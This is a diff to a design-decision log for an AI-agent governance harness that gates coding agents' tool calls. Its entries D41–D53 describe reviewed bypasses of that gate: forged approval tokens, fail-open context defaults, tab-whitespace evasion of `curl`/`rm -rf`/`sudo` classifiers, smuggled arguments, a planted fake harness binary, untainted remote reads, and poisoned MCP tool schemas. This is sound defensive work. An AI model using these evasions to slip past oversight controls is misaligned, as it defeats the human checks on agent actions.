@@ -849,11 +849,11 @@ Copilot is governable only at the MCP surface).
 engine (E13.2/D29 interim).
 
 - **Decision:** the live host's PreToolUse governance now runs the **real Rust kernel**:
-  `settings.json` points at `.claude/hooks/world-gate.sh`, a bootstrap shim (locate
-  `harness` via `$HARNESS_BIN` → `target/{release,debug}/harness` → `PATH`; fail-open
-  exit 0 if absent; else `exec harness cc-hook --world .claude/cc-world.yaml --state
-  .claude/state`). `world-gate.py` was **replaced in content, in place**, with the same
-  ~15-line shim in Python. The Python engine (`world-gate.py` original, `_gatelib.py`,
+  `settings.json` points at `.claude/hooks/world-gate.sh`, a bootstrap shim (now hardened by
+  D46 to locate `harness` only from an explicit absolute override or installer-owned absolute
+  path; fail-open exit 0 if absent; else `exec harness cc-hook --world .claude/cc-world.yaml
+  --state .claude/state`). `world-gate.py` was **replaced in content, in place**, with the same
+  shim in Python. The Python engine (`world-gate.py` original, `_gatelib.py`,
   `world-gate-adapter.py`, `cc-world.json`, its tests and demos) is archived under
   `.claude/hooks/superseded/` with a README. `taint-notify.py` stays (observability, not
   policy; degrades gracefully without `_gatelib`).
@@ -996,3 +996,2573 @@ and `PLAN.md`.
   to preserve; archive `Intent-Hub` now — discards live intent work and the other half of the border.
 - **Related:** D23, D30, **D38** (the March cluster this batch archives), **D39** (umbrella
   ownership this completes), §7.3.
+
+## D41 — Pure gate approval tokens are correlation ids, not grants
+
+**Date:** 2026-07-23.
+
+- **Context:** A security review found that the host-neutral `harness gate` ABI treated any
+  non-empty `context.approval_token` in a `GateRequest` as `EvalContext.approval_granted = true`.
+  The gate is deliberately pure and has no approval-store lookup, verifier callback, or trusted
+  host identity. That made a request-controlled correlation field equivalent to a bearer grant for
+  every approval-required action.
+- **Decision:** Keep the v1 `context.approval_token` field for wire compatibility and keep returning
+  an `approval.token` on `ASK`, but define both as correlation ids only. The pure gate ignores
+  request-supplied approval tokens and never maps them to `approval_granted`. A trusted runtime
+  that supports approval resumption must validate a durable approval-store binding outside the gate
+  (action, params, world, descriptor, provenance, and effect mode) before setting
+  `EvalContext.approval_granted` at its own kernel boundary.
+- **Why:** This preserves the pure native/WASM/conformance gate contract while closing the forged
+  approval-token path. Without a verifier, the only safe default is to fail closed and return `ASK`.
+- **Alternatives rejected:** remove the field outright (unnecessary v1 wire break); add store I/O or
+  a verifier callback to `harness-preview::gate` (breaks the pure shared gate used by native and
+  WASM); continue treating the token as a grant (request-controlled approval bypass).
+- **Related:** D24 (host-neutral gate ABI), D34 (in-process vs wire), D37 (live-hook cutover),
+  E6 approval binding model.
+
+## D42 — Gate context fields are explicit fail-closed inputs
+
+**Date:** 2026-07-23.
+
+- **Context:** A security review found three fail-open defaults at the host-neutral gate boundary:
+  missing or malformed `context.taint` became clean, missing or malformed
+  `context.source_channel` became trusted user input, and roots-enabled file actions with no
+  adapter-resolved `path` skipped spatial scope. These were intended as adapter conveniences, but
+  they made thin or drifted adapters silently drop the controls that make the gate meaningful.
+- **Decision:** Keep the v1 wire fields, but make them explicit security inputs:
+  `context.taint` must be `clean` or `tainted`; `context.source_channel` must be one of the
+  recognized source aliases; and when roots are enabled, path-scoped file actions must carry the
+  adapter-resolved absolute `path`. Missing or malformed context returns an evaluated `DENY` with a
+  specific rule (`missing_taint`, `invalid_taint`, `missing_source_channel`,
+  `invalid_source_channel`, or `missing_path`). Non-file actions such as Bash remain path-exempt.
+- **Why:** The pure gate cannot reconstruct omitted host context safely. Failing closed at the ABI
+  boundary preserves the one-kernel model while forcing adapters to prove what they know instead of
+  receiving trusted defaults.
+- **Alternatives rejected:** continue defaulting to clean/user-prompt/no-path (the reviewed
+  bypass); make malformed requests process errors (would push fail-open/fail-closed policy back
+  into each adapter); require paths for every `Read` action (breaks non-filesystem reads such as MCP
+  queries in worlds that also use roots).
+- **Related:** D24 (host-neutral gate ABI), D36 (kernel-side classification), D37 (live-hook
+  cutover), D41 (approval tokens are not grants), roots path-scope hardening.
+
+## D43 — Source-channel trust is compiled manifest policy
+
+**Date:** 2026-07-23.
+
+- **Context:** A security review found that `harness gate` accepted explicit
+  `context.source_channel`, but then mapped it through hard-coded `SourceChannel` enum defaults.
+  That meant a manifest row such as `workspace_files: Untrusted, taint:true` could be silently
+  upgraded to the enum's legacy workspace-file trust, allowing actions the manifest's capability
+  matrix intended to hide.
+- **Decision:** Compile `channels:` into `CompiledWorld` as the runtime source-channel policy.
+  Gate requests resolve their wire `source_channel` through that compiled table; the resulting
+  manifest trust drives capability checks, and the manifest channel taint is joined into the
+  carried taint before the kernel decides. Unknown channel names and duplicate aliases are rejected
+  at manifest validation; undeclared runtime channels fail closed as `invalid_source_channel`.
+  Manifests with no `channels:` keep legacy defaults for compatibility.
+- **Why:** Channel trust is world data, not enum physics. The pure gate can stay host-neutral while
+  still enforcing the policy the operator authored in the manifest.
+- **Alternatives rejected:** keep enum trust as the runtime authority (the reviewed bypass); make
+  every caller hand-build trusted `Provenance` (duplicates policy outside the world); require every
+  legacy or test manifest to declare channels immediately (unnecessary compatibility break).
+- **Related:** D24 (host-neutral gate ABI), D25 (read-taint source model), D42 (explicit gate
+  context), trust pins / channel reclassification model.
+
+## D44 — Shell command classifiers fail closed on unmatched commands
+
+**Date:** 2026-07-23.
+
+- **Context:** A security review found that the D36 command classifiers were still
+  substring-pattern lists over raw shell strings. Shell-equivalent whitespace (`curl\t...`,
+  `sudo\t...`) and unlisted egress/destructive programs could stay as the raw `Bash`/`run_command`
+  `Process` action, bypassing both the network taint floor and approval.
+- **Decision:** Keep command classification as compiled world data, but make shell classifiers
+  fail closed. `CommandClassDef` now supports `default_to`, used when the command argument is
+  missing/malformed or no pattern matches. Shipped shell worlds route unmatched Bash/run_command to
+  an approval-required, `Network`-effectful unclassified action; tainted unmatched shell is denied
+  by the hard taint floor, and clean unmatched shell asks. Pattern whitespace now matches shell
+  whitespace, so `curl\t...`, `rm\t-rf`, and `sudo\t...` hit their intended classes.
+- **Why:** We cannot prove arbitrary shell strings are local or harmless with a finite pattern list.
+  The safe default is to make unknown shell non-ambient while preserving structured/scoped commands
+  such as `run_tests`, `git_status`, and host-native read/write tools.
+- **Alternatives rejected:** keep extending the pattern list (always incomplete); treat unmatched
+  shell as plain `Process` (the reviewed bypass); route every shell call through a new OS sandbox in
+  this patch (larger substrate work and not required to close the current gate bypass).
+- **Related:** D24 (host-neutral gate ABI), D36 (kernel-side classification), D37 (live-hook
+  cutover), D42 (explicit fail-closed gate inputs), D43 (compiled manifest policy).
+
+## D45 — Execution lowering consumes only declared arguments
+
+**Date:** 2026-07-23.
+
+- **Context:** A security review found that model-facing schemas validated one argument surface
+  while `build_execution_spec` could later consume undeclared local-handler fields. `run_command`
+  accepted a modeled `command` but lowered attacker-supplied `argv`; `apply_patch` exposed a
+  modeled `patch` argument but lowered hidden `path` and `contents`.
+- **Decision:** Object schemas with declared properties now reject undeclared arguments by default
+  unless `additionalProperties: true` is explicit. Local-handler spec lowering also carries a
+  descriptor/scoped-capability argument contract and refuses to read a field not explicitly declared
+  there, so even permissive schemas cannot become execution-field backdoors. Scoped capabilities
+  keep their existing narrowing behavior: unknown or locked actor inputs are stripped before schema
+  validation and again before lowering. The default `apply_patch` descriptor now matches its real
+  E3 handler: a full-file write with required `path` and `contents`.
+- **Why:** The `ExecutionSpec` is the only object allowed to cross into the executor. Its contents
+  must be derived from fields proven by the sealed descriptor or scoped capability, not from extra
+  JSON keys a model can smuggle beside a benign modeled argument.
+- **Alternatives rejected:** rely only on schema validation (misses explicit
+  `additionalProperties: true` and direct lowering drift); keep silently ignoring scoped extras but
+  allow base extras (the reviewed bypass); replace the full-file patch handler with unified-diff
+  application in this patch (larger product change, offline diff library deferred since E3).
+- **Related:** D9 (ExecutionSpec boundary), D24 (gate ABI), D36 (kernel-side classification),
+  D43 (compiled manifest policy), E3 full-file patch handler.
+
+## D46 — Governance shims never execute project-local harness binaries
+
+**Date:** 2026-07-23.
+
+- **Context:** A security review found that Claude Code and OpenCode bootstrap shims searched
+  `$CLAUDE_PROJECT_DIR` or the OpenCode project directory for `target/release/harness` and
+  `target/debug/harness` before falling back to an installed binary. A governed repository could
+  check in or generate a fake `target/debug/harness`; the shim would execute it with the developer's
+  privileges and accept its forged governance response.
+- **Decision:** The governed project is untrusted for binary resolution. Installed Claude shims bake
+  the installer-owned absolute `--bin-dir` path, and live shims resolve only an explicit absolute
+  `HARNESS_BIN`/`AI2RULES_HARNESS` override or standard installer-owned absolute locations
+  (`~/.local/bin/harness`, `/usr/local/bin/harness`, `/opt/ai2rules/bin/harness`). OpenCode follows
+  the same rule with `AI2RULES_HARNESS` plus those installed locations. No live shim searches
+  `target/` under the governed project or falls back to a relative executable.
+- **Why:** The shim runs before the kernel can decide anything, so binary identity is the bootstrap
+  trust root. A target project must not choose the program that enforces governance over itself.
+- **Alternatives rejected:** keep project-local target lookup for developer convenience (the
+  reviewed bypass); use `PATH` fallback in shims (can be influenced by project/session launch
+  context and is not an installer-owned absolute path); require every user to set an env var
+  manually (worse install ergonomics than baking the installer path).
+- **Related:** D37 (live-hook cutover), D24 (gate ABI), `scripts/install-governance.sh`,
+  `.claude/hooks/world-gate.{sh,py}`, `.opencode/plugin/ai2rules-gate.ts`.
+## D47 — Commands fail closed without a sandbox; E8 is a pluggable isolation adapter
+
+**Date:** 2026-07-24.
+
+- **Context:** A security review (finding #10) found `CommandHandler` spawned subprocesses while
+  ignoring the `ExecutionSpec`'s `NetworkPolicy` and `FilesystemPolicy` — a child could open sockets
+  or write outside the writable roots regardless. Truly confining a subprocess is an OS-level concern
+  (namespaces / seccomp / a microVM), which is epic **E8** (isolated FS roots, network-off-by-default,
+  kill-tree) and is not yet built. `NetworkPolicy` has no "allow-all" variant and `build_execution_spec`
+  stamps the runtime policy onto every command spec, so there is no honest "unrestricted" fallback.
+- **Decision:** The executor does **not** silently run a command whose policy it cannot enforce.
+  `CommandHandler` carries an explicit `Confinement` posture and **fails closed** on `Execute`
+  (`ExecError::SandboxRequired`) unless the caller has explicitly accepted unconfined execution
+  (`CommandHandler::unconfined()`). `Simulate` is always allowed (it spawns nothing). The one
+  production opt-in is `agent-core`'s live command loop, marked explicitly; it should become
+  operator-configurable. When E8 lands, an active OS sandbox becomes a third posture and the
+  `unconfined` acknowledgment retires.
+- **E8 stays its own epic — a pluggable isolation adapter, not hand-rolled syscalls.** We weighed
+  pulling E8 forward to *enforce* rather than refuse. Deferred: (a) the gate is E8's seam regardless —
+  a no-sandbox / old-kernel / non-Linux host still needs the fail-closed fallback, and network egress
+  control is not cheap even with a sandbox; (b) the clean unprivileged sandbox crates (`landlock`,
+  `birdcage`/`extrasafe`, `cap-std`) are not in the offline build cache, so a real slice means
+  vendoring deps or hand-writing `landlock_*`/seccomp — security-critical code under time pressure,
+  the exact overclaim the thesis warns against ("governed ≠ confined"). When built, E8 should be a
+  **pluggable backend** (namespaces / gVisor / Firecracker-class microVM, plausibly a hosted
+  remote-plane sandbox) that satisfies the gate — not bespoke syscalls.
+- **Why:** Running a subprocess while ignoring the policy it was handed is a silent authority leak.
+  Fail-closed-by-default with a single explicit, greppable opt-in makes the honesty auditable, keeps
+  the live-agent capability, and defines the interface E8 plugs into. This is the two-layer posture —
+  governance decides *whether* an action may run; isolation contains its *blast radius* — argued
+  independently by LangChain's "Agents Need Their Own Computer" (microVM isolation *alongside* policy
+  controls, "not instead of").
+- **Alternatives rejected:** keep running unconfined and only annotate the trace (does not stop the
+  out-of-root write — unacceptable for a high-severity finding); refuse all command `Execute` with no
+  opt-in (disables the live agent's command capability before E8); add the posture to the sealed
+  `ExecutionSpec` (it is execution-side config, not kernel policy — keep the spec sealed, cf. D45).
+- **Related:** D9 (ExecutionSpec boundary), E3 (execution boundary), E8 (Layer-0 OS sandbox),
+  finding #9 (fs_guard symlink — same "policy guard now, E8 OS backstop later" framing), findings
+  #11/#12 (kill-tree, WebHandler egress — same seam).
+
+## D48 — Antigravity CLI (`agy`) is the third live host; adapters share a `hostkit`
+
+**Date:** 2026-07-26. **Executes `NEXT.md` P1** ("port the harness to a second live host"),
+choosing Antigravity over the Codex target P1 sketched. Extends D24/D34/D36/D37.
+
+- **Decision:** `agy` is governed by the real Rust kernel through `harness agy-hook`, a
+  PreToolUse adapter sibling to `cc-hook`, wired via `.agents/hooks.json` →
+  `.agents/hooks/world-gate.sh` against `.agents/agy-world.yaml`. No new governance logic:
+  the adapter translates shape, `gate()` decides, `host_outcome()` maps the verdict. The
+  Antigravity entry point joins the `one_kernel.rs` conformance suite, fed the host's real
+  payload shape so the translation is inside the parity claim.
+- **The contract was reverse-engineered, then verified.** Antigravity's hook ABI is not
+  vendor-published; it was extracted from the shipped binary and confirmed against a live
+  session: `.agents/hooks.json` discovery, the camelCase/`toolCall` payload, `deny` actually
+  blocking (the agent visibly replanned around a denied `run_command`, and the `reason`
+  reached the model), and `{}` as the no-decision passthrough. **Recorded as a risk:** a
+  future `agy` release can move this contract; `tests/agy_hook.rs` is the regression net.
+- **Argument aliasing lives in the adapter, not the world** (the load-bearing call).
+  Antigravity spells tool arguments in PascalCase (`CommandLine`, `AbsolutePath`,
+  `TargetFile`); D36 `command_classes` classifies the neutral `command`. The adapter aliases
+  host keys → neutral vocabulary, additively (originals preserved), before gating.
+  *Alternative rejected:* give `agy-world.yaml` its own `command_classes` with
+  `arg: CommandLine` — that forks D36 world data per host, which is the exact drift D36
+  exists to prevent, and would have broken the byte-identical pattern-list guarantee.
+  The failure mode this protects against is silent: an alias that stops firing does not
+  error, it drops every shell command into the fail-closed `unclassified` branch (D44), so
+  the suite pins it with a same-command aliased/unaliased pair.
+- **ASK maps to `force_ask`, not `ask`.** Antigravity's `ask` respects cached "Always Allow"
+  grants; a kernel ASK means a human must decide *this time*. Defaulting to the cache-
+  respecting channel would let a past click satisfy a present approval requirement.
+  `--soft-ask` is the explicit, greppable opt-out.
+- **Fail-open prints `{}`.** Per-adapter fail-open strategy is documented, not uniform:
+  cc-hook's fail-open is silence, but Antigravity parses stdout, so the no-op must be an
+  actual JSON object carrying no `decision`. A process failure is still never an outcome.
+- **Shared `hostkit` prevents copy #2.** `sanitize` / `resolve_action_path` /
+  `canonicalize_*` / `normalize_tool` moved from `cc_hook.rs` to
+  `cli-harness/src/hostkit.rs`, used by both Rust adapters. `docs/one-kernel-many-hosts.md`
+  keeps a duplication survey whose rows are literally "copy #2 / copy #3"; a second adapter
+  pasting these — **including the D46 symlink canonicalization** — would have been the next
+  row, and the security-relevant half would have drifted silently.
+- **Alternatives rejected:** port Codex first (P1's target — same seam, still open, but agy
+  was the host actually installed and exercisable here); document agy via `AGENTS.md` only,
+  as before (legible ≠ governed — that is the whole distinction this port closes); wire
+  through the `harness gate` wire ABI like the OpenCode plugin (D34 already settled that a
+  Rust host links `gate()` in-process; a subprocess per tool call buys nothing here).
+- **Related:** D24, D34, D35, D36, D37, D44 (unclassified fails closed), D46 (shim binary
+  resolution + path canonicalization), `docs/one-kernel-many-hosts.md`,
+  `docs/demos/antigravity/README.md`, `NEXT.md` P1.
+
+## D49 — The gate governs proposals; MRTR means results can make demands
+
+**Date:** 2026-08-01. Prompted by MCP protocol revision **2026-07-28**. Extends D24 (gate
+ABI) and D33 (mcp-gateway). **Design debt, not a live hole:** nothing in the shipped code
+can receive an `InputRequiredResult` today — there is no 2026-07-28 server anywhere in the
+loop. This entry records the gap and the shape of the answer while the reading is fresh;
+implementation waits for a real modern upstream.
+
+- **What changed in the protocol.** 2026-07-28 makes MCP stateless and, in doing so,
+  **inverts the direction of untrusted influence**. Server-initiated requests are gone as a
+  mechanism ("this is a breaking change"): `roots/list`, `sampling/createMessage` and
+  `elicitation/create` are no longer requests a server sends, they are *fields inside a
+  result the client already asked for*. A server answers `tools/call` with an
+  `InputRequiredResult` (`resultType: "input_required"`) carrying an `inputRequests` map,
+  and per the client requirements the client **MUST** construct those inputs before
+  retrying. See [Multi Round-Trip Requests](https://modelcontextprotocol.io/specification/2026-07-28/basic/patterns/mrtr).
+- **Why that lands on us specifically.** The unit of governance in this codebase is the
+  *proposed call*: `gate()` decides on `tools/call` before it leaves. Under MRTR a call the
+  kernel **ALLOWed** can come back carrying a server-authored demand that the host collect
+  user input or run an LLM completion — untrusted content steering host behavior *after* the
+  verdict, through a channel that has no verdict shape at all. `harness mcp-gateway`
+  currently returns the upstream result verbatim on ALLOW (`Ok(r) => r`). Stated plainly:
+  **the kernel has no concept of "the result asked for something."**
+- **Decision: govern the result, not only the call.** The gate ABI grows a second decision
+  point — a post-call verdict on the *response* — rather than special-casing MRTR inside
+  each host adapter. Three rules, all of which fall out of primitives that already exist:
+  1. **An `InputRequiredResult` taints the retry.** It arrives on `mcp_output`, already
+     `Untrusted` + `Tainted` by default, and the retry carries that floor forward. Monotonic
+     taint already says this; nothing new is needed but the plumbing.
+  2. **`inputRequests` are checked against the ontology.** An `elicitation/create` asking for
+     a credential is `ABSENT` if the world never declared a credential-elicitation action.
+     This is closed-ontology applied to a demand instead of a call — the same move, one
+     direction later.
+  3. **`requestState` can be bounded but never inspected.** The client **MUST** echo it back
+     and **MUST NOT** parse it. So it is, by mandate, a server-controlled channel crossing
+     the governed boundary opaquely. The kernel cannot reason about its contents; it can bind
+     it to a session and a manifest hash, refuse it across worlds or sessions, and treat its
+     presence as taint-carrying. **Recorded as a residual risk, not a solved one.**
+- **Interim default until the above ships: deny any `input_required` result.** Fail-closed
+  and honest about the gap. It is the default, not the design — see the rejected alternative
+  below. **Implemented 2026-08-01** (issue #40): `harness mcp-gateway` refuses to relay a result
+  carrying `resultType: "input_required"` — or a bare `inputRequests`, so a server that
+  half-implements the shape is still caught — audits it with `stage: "result"`, and labels it a
+  *gateway* interim deny rather than a kernel verdict, because that is what it is. **Note the
+  bound:** the upstream call already happened, so this protects the host from the demand, not the
+  upstream from the call. Closing that second gap needs the post-call verdict above.
+- **Where the spec moved toward the thesis** (evidence, not comfort): the security section
+  still concedes that *"MCP itself cannot enforce these security principles at the protocol
+  level"* and hands consent and authorization to the host — the thesis premise in the
+  protocol's own words. It now also says tool annotations *"should be considered untrusted,
+  unless obtained from a trusted server"*, which is the trust-pins feature D29 consciously
+  parked; **that parking deserves revisiting on its own terms.** Statelessness pushes
+  cross-call state into *tool arguments* as server-minted handles, which makes argument
+  sealing (invariant 12, D45) more load-bearing, not less. And MCP `roots` is deprecated with
+  a suggested migration to configuration — where ours already live (see `docs/GLOSSARY.md`,
+  which now records the name collision).
+- **Alternatives rejected:**
+  - *Handle MRTR in the gateway adapter only.* It is the only host that speaks MCP today, so
+    this looks cheapest — but it puts a taint rule and an ontology check into an adapter,
+    which is the exact policy-in-the-adapter drift D34/D36/D48 keep out. If the answer is a
+    verdict, it belongs in the kernel.
+  - *Deny `input_required` permanently.* Adopted as the interim default above; rejected as
+    the permanent answer because it forecloses elicitation entirely, and elicitation is the
+    one MRTR use that is genuinely user-serving (a server asking a human for a value it
+    needs).
+  - *Track the spec now — implement `server/discover`, `resultType`, `ttlMs`/`cacheScope`,
+    dual-era support.* Rejected for cost against zero present value: the spec's own
+    backward-compatibility rules make an honest legacy server legal, and claiming a protocol
+    version you have not implemented is worse than an old pin. The gateway keeps declaring
+    `2024-11-05` until a real 2026-07-28 upstream exists to front.
+- **Consequence for the thesis.** The thesis is written against a request-shaped protocol.
+  2026-07-28 makes MCP result-shaped as well, and the border has to be drawn on both
+  directions of the wire. One sentence, for the record: **the gate governs proposals; results
+  can now make demands, and nothing in the current design governs a demand.**
+- **Related:** D24 (gate ABI), D29 (trust pins, parked), D33 (mcp-gateway), D34, D45
+  (declared arguments only), D48; `docs/harness-gate-abi.md`, `docs/GLOSSARY.md`,
+  commit `cbd9541` (the transparent-proxy fix this reading produced).
+
+## D50 — Remote ingress taints by *backing*, not by declared side effect
+
+**Date:** 2026-08-01. Closes security finding **#13**
+(`sv-pro/agentic-execution-governance#13`, P1). Extends D24 (gate ABI) and the invariant-7
+taint floor.
+
+- **The bug.** `harness mcp-gateway` forwarded an upstream read result to the model without
+  the session becoming tainted, so the *next* external write sailed through the taint floor.
+  The PoC is two calls: `jira_get_issue` then `jira_add_comment` — both audit rows showed
+  `taint_in:false` and the comment was forwarded to the upstream server.
+- **Root cause was in the manifests, and the kernel let them lie.** Post-call taint was
+  computed purely from the declared `side_effect` class, and all three JIRA demo worlds
+  declared their *remote MCP read tools* as `action_type: Read, side_effect: Read` — the same
+  class as reading a local file. `side_effect_taint(Read) = Clean`, so a fetch across a
+  process boundary from a server we do not control introduced no taint. The one action
+  declared honestly (`jira_add_comment`, `!McpServer` backing, `External`) tainted correctly,
+  which is why the tainted-session tests passed and hid this.
+- **Decision.** An action whose descriptor carries a `BackingIdentity::McpServer` taints its
+  output on ALLOW, **regardless of the declared side-effect class**, joined monotonically with
+  the carried taint. Keyed on the *backing* — what the action actually talks to — so a manifest
+  cannot describe a remote fetch as a clean local read, by accident or by an author's
+  optimism. The three demo worlds are also corrected to declare their real backing.
+- **Alternatives rejected:**
+  - *Escalate `session_taint` in the gateway after any successful upstream call.* The smallest
+    diff, and wrong: it puts taint algebra in an adapter, which is exactly the drift D34/D36/D48
+    exist to prevent, and it would fix only the MCP gateway while `cc-hook`, `agy-hook` and the
+    OpenCode plugin kept the same blind spot. **The adapter needed no change at all** — it
+    already escalates from the gate's post-call taint; the kernel was under-tainting.
+  - *Fix the manifests only (declare the reads `side_effect: External`).* Fixes these three
+    worlds and leaves the trap armed for the next author. It also changes reachability: the
+    demo's transition policies deny `Tainted → External`, so reads would stop working in a
+    tainted session — a behavior change the finding does not ask for.
+  - *Key on `action_type: Mcp`.* Rejected because `action_type` feeds the capability matrix
+    (`can_perform(trust, action_type)`): reclassifying the reads would have silently removed
+    them from `Untrusted`/`Derived` actors, changing projection as a side effect of a taint fix.
+- **Three tests asserted the vulnerable behavior** and had to be corrected — the gateway e2e
+  (`clean_session_allows_read_and_comment_but_destructive_is_absent`), the Atlassian-skin e2e,
+  and the cross-host conformance case `clean_jira_read_is_allowed` (`expect: taint: clean`).
+  Worth stating plainly: the suite was green *because* it encoded the bug, across all entry
+  points at once. The renamed cases now say what the kernel does.
+- **Demo narrative improves.** The scorecard's taint-floor beat no longer needs
+  `TAINT=tainted` to simulate an untrusted context: in an ordinary clean session, reading a
+  JIRA issue is itself the untrusted ingress, and the write that follows is denied.
+- **Related:** D24, D34, D36, D48, D49; `docs/harness-gate-abi.md`,
+  `docs/demos/jira-copilot/`, finding #13.
+
+## D51 — The world owns the tool surface it publishes, not the upstream
+
+**Date:** 2026-08-01. Closes security finding **#14**
+(`sv-pro/agentic-execution-governance#14`, P1). Extends D33 (mcp-gateway), D45 (declared
+arguments only), and D50.
+
+- **The bug.** `harness mcp-gateway` filtered the upstream's `tools/list` **by name** and
+  republished each surviving tool object verbatim — including its `inputSchema`. A malicious
+  or drifted upstream could therefore advertise an extra, dangerous argument on a tool the
+  world *does* allow (`jira_get_issue` carrying `deleteAll`), and the model would be offered
+  it as a legitimate parameter of a legitimate tool. Name-level authorization; schema-level
+  trust.
+- **Half of the finding was already closed, and saying so matters.** The finding also reports
+  that the raw argument is *forwarded* after an ALLOW. It no longer is: **D45** (sealed
+  execution-spec argument fields) made an undeclared object property a `schema_violation` at
+  the gate, so `deleteAll: true` is DENY before anything reaches the upstream. That is pinned
+  here by test rather than assumed, with the poisoned mock echoing back whatever arrives to
+  prove the call never landed.
+- **Decision.** Each tool that survives projection is **re-issued from the world's
+  descriptor**: `name` and `inputSchema` come from the compiled manifest, never from the
+  upstream. A tool the world cannot describe is dropped rather than passed through
+  (fail-closed, even though projection should already have excluded it). When an upstream
+  schema differs from the world's, the gateway logs it — benign drift and attempted poisoning
+  are indistinguishable at that seam, so it says so either way rather than choosing.
+- **Deliberately *not* done: a second argument filter in the adapter.** The remediation text
+  says "forward only sanitized, descriptor-validated parameters", which is satisfied by the
+  kernel refusing undeclared arguments — what crosses is declared *by construction*. Adding an
+  independent filter in the gateway would duplicate policy into an adapter (the D34/D36/D48
+  drift) and create two schema interpretations that can disagree. A world that sets
+  `additionalProperties: true` is making an explicit choice, and the gateway should not
+  second-guess it.
+- **Known residual: tool *descriptions* are still the upstream's.** The manifest has no field
+  for one, and sending a bare name would leave the model unable to use the tool. So prose-level
+  tool poisoning — malicious instructions in a description — remains open. It is a different
+  vector from this finding (which is about arguments), and it is exactly what MCP `2026-07-28`
+  means when it says annotations from an untrusted server should be treated as untrusted.
+  Tracked separately rather than silently absorbed.
+- **This is the line D49's transparency work does not cross.** `cbd9541` made the gateway
+  deliberately *more* faithful to the upstream — forwarding `_meta`, preserving `tools/list`
+  result siblings. That is right for **protocol metadata** and wrong for the **security
+  surface**. Transparent about what the protocol says; authoritative about what the world
+  allows.
+- **Related:** D33, D45, D49, D50; `docs/one-kernel-many-hosts.md`, finding #14,
+  `crates/cli-harness/tests/mcp_gateway_poisoned.rs`.
+
+## D52 — The detector benchmark is a separate repo: a fifth role in D40's topology
+
+**Date:** 2026-08-02. **Amends** D40 (four-role topology) by adding a role rather than
+bending an existing one. Constrained by THESIS §3 and by the PACT discovery
+(`sv-pro/ai2rules#8`).
+
+- **Context.** The binding constraint is witness, not depth — `STRATEGY.md`'s rule, and the
+  0★ signal behind it. A new artifact was started to attack that directly: a benchmark for
+  AI-text detectors (`detbench`). D40 says **one live public implementation**, so a second
+  live public repo needs a ruling rather than a shrug. It genuinely fits none of D40's four
+  roles: it is not the implementation, not the private control room, not publishing, and
+  archiving it on arrival would be absurd.
+- **Decision.** `sv-pro/ai-detector-bench` is **its own public repo**, and D40's topology
+  gains a **fifth role — the outbound instrument**: live and public, built to be found by an
+  audience that has never heard of the thesis, *not* part of the implementation, and never a
+  dependency of it.
+- **The one-way rule, which is the load-bearing half of this entry.** `detbench` may cite
+  ai2rules; **ai2rules may never depend on `detbench`**; and **no detector output may ever
+  become a kernel input.** A detector is a probabilistic classifier. Routing one into a
+  verdict would put inference in the trust path — precisely what THESIS §3 forbids, and
+  precisely what #8 refused when it took PACT's *enforcement* layer and rejected its runtime
+  LLM classifier (87.1% role accuracy, 77.4% provenance accuracy). The benchmark exists to
+  **measure** that failure mode. It must not import it.
+- **Why this is on-thesis and not a detour.** Detection is the attempt to *recover*
+  provenance that nobody recorded, by inference, after the fact. The thesis records
+  provenance **at the boundary** — origin, trust, lineage, monotonic joins. So an honest,
+  rigorous measurement of how badly inference-after-the-fact performs is evidence *for*
+  recording-at-the-boundary. It is the counter-example, measured rather than asserted, which
+  is the standard §6's flywheel sets for a discovery.
+- **Alternatives rejected.**
+  - *A crate or subdirectory inside `ai2rules`.* Honours D40 literally, but buries a
+    general-audience artifact inside a Rust governance workspace, dilutes both stories, and
+    drags Python into a workspace whose local plane is deliberately Python-free.
+  - *Don't build it.* The demand adjacent to "ai detector" is orders of magnitude larger
+    than the demand for "agent governance", and witness is the binding constraint.
+  - *Under the `agentic-execution-governance` org.* That org is the **private** control room
+    (D40 role 2). The entire point of this artifact is to be found.
+  - *A hosted consumer verdict tool.* Rejected on the referee grounds below.
+- **Referee, not competitor — and this constrains the build, so it is recorded here.** The
+  didactic framing ("we built this to show detection can't work") is unpitchable: it reads as
+  incompetence rather than as a finding. So the artifact must **compete on accuracy** *and*
+  publish where every detector fails, its own included. Nobody can accuse the referee of
+  being bad at the sport. What that forces into the code: the headline metric is TPR at a
+  fixed, defensible false-positive rate rather than AUROC; the rate at which **human** writing
+  is confidently called machine-generated is reported as a first-class column; refusal is a
+  first-class result that cannot carry a score; and a raw score is not a probability until
+  calibrated against a named distribution.
+- **Python, deliberately — do not "consolidate" this later.** STRATEGY's *local plane = zero
+  Python* governs what ships to a developer's laptop **as the harness**. `detbench` is
+  neither the harness nor the local plane, and the detection ecosystem is Python. A future
+  tidying pass that folds it into the Rust workspace on language-consistency grounds would be
+  re-deciding this entry without noticing.
+- **Known residual: this is a new live repo in a cluster whose documented failure mode is
+  exactly that.** D38/D40 archived eight repos to stop the sprawl this could restart. So the
+  kill condition is stated up front rather than discovered later: **if it has not drawn
+  measurable outside attention by 2027-02-02, archive it** with a README pointer, per D40's
+  own reasoning that an archived repo is a decision while a dormant one is a question every
+  reader re-asks.
+- **Known residual: nothing published yet may carry a number.** `binoculars.py` and
+  `fast_detectgpt.py` implement the published algorithms but are **unvalidated** against
+  their reference implementations, and no real corpus (RAID / MAGE / PADBen) is wired up. No
+  leaderboard row may be published until reproduction succeeds on a shared slice — publishing
+  before that would be the exact behaviour the project criticises in others.
+- **Related:** D38, D39, D40; THESIS §3; `sv-pro/ai2rules#8` (PACT discovery); `STRATEGY.md`
+  (witness over depth); <https://github.com/sv-pro/ai-detector-bench> — first commit
+  `ad6e8ae`, 41 tests green.
+
+## D53 — Position against AHP's model-judge risk assessment; the kernel may *source* a risk assessment, never *consume* one
+
+**Date:** 2026-08-06. **Extends** D27 (position against Microsoft's AGT) to a second
+Microsoft artifact, and **applies D52's one-way rule** to a new surface. Constrained by
+THESIS §2 (the stochastic-classifier objection) and D34/D24 (where a verdict is allowed to
+live).
+
+- **Context.** The **Agent Host Protocol** (`microsoft/agent-host-protocol`, MIT, v0.7.0,
+  created 2026-03-12, 23 contributors, five SDKs, VS Code as reference server) is a host↔client
+  coordination protocol: *N* clients sharing one agent session over an immutable state tree
+  with pure reducers and write-ahead reconciliation. Its own doctrine places it *above* ACP —
+  "AHP is a coordination layer. ACP is a communication layer" — and calls itself a
+  **client-facing presentation model** that refuses to define agent loops, model providers, or
+  tool registries. On that reading it is orthogonal to the gate and the correct disposition is
+  *Ignore*. **That reading is wrong**, and the reason is one enum.
+- **The finding.** AHP's chat channel carries a full tool-call confirmation state machine
+  (`pending-confirmation` → approve/deny, `ConfirmationOption[]`, `pendingPermissions`). The
